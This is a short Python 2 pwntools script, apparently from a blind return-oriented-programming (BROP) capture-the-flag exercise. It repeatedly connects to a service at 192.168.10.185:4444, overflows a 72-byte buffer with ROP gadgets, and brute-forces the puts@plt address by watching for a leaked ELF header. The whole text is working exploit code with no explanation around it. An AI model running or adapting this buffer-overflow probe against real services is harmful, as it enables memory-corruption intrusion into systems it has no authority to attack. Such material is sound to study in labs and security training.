from pwn import*

def get_puts(length,rdi_ret,stop_gaddet):
    addr = 0x400000
    while 1:
        print hex(addr)
        p = remote('192.168.10.185',4444)
        p.recvuntil('password?\n')
        payload = 'a'*length + p64(rdi_ret) + p64(0x400000)+p64(addr) + p64(stop_gadget)
        p.sendline(payload)
        try:
            content = p.recv()
            if content.startswith('\x7fELF'):
                print 'find puts@plt addr : 0x%x'%addr
                return addr
            p.close()
            addr+=1
        except Exception:
            p.close()
            addr+=1

length = 72
rdi_ret = 0x4007ba + 0x9
stop_gadget = 0x4006d5
puts = get_puts(length,rdi_ret,stop_gadget)
#find puts_add --> [0x400565]
#puts_plt = 0x400560
